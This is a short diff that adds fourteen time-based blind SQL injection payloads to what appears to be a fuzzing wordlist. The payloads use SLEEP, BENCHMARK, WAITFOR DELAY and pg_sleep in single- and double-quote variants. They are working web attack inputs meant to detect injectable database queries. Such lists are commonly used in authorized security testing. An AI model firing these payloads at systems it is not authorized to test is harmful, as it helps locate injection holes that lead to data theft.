@@ -1,1 +1,15 @@
+' OR SLEEP(5) --
+" OR SLEEP(5) --
 ' UNION SELECT SLEEP(5) -- ;
+'; WAITFOR DELAY '0:0:5' --
+" WAITFOR DELAY '0:0:5' --
+' BENCHMARK(10000000,MD5(1)) --
+" BENCHMARK(10000000,MD5(1)) --
+' pg_sleep(5) --
+" pg_sleep(5) --
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
+" AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
+' AND SLEEP(5) --
+" AND SLEEP(5) --
+' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --
+" OR (SELECT * FROM (SELECT(SLEEP(5)))a) --
